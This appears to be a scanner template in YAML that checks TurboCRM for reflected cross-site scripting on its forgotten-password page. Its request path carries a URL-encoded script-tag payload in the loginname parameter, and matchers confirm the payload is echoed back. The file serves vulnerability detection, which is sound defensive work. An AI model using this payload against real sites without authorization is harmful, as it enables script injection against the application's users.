id: "turbocrm-xss"
name: "TurboCRM - Cross-Site Scripting"
severity: "high"
description: "TurboCRM contains a cross-site scripting vulnerability which allows a remote attacker to inject arbitrary JavaScript into the response returned by the application."
tech:
  - "php"
tags:
  - "xss"
  - "turbocrm"
  - "vuln"
cwe: "CWE-79"
reference: "https://gist.github.com/pikpikcu/9689c5220abbe04d4927ffa660241b4a"
spaExclusion: true
request:
  method: "GET"
  path: "/login/forgetpswd.php?loginsys=1&loginname=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "\"><script>alert(document.domain)</script>"
  - type: "word"
    part: "header"
    words:
      - "text/html"
  - type: "status"
    status:
      - 200
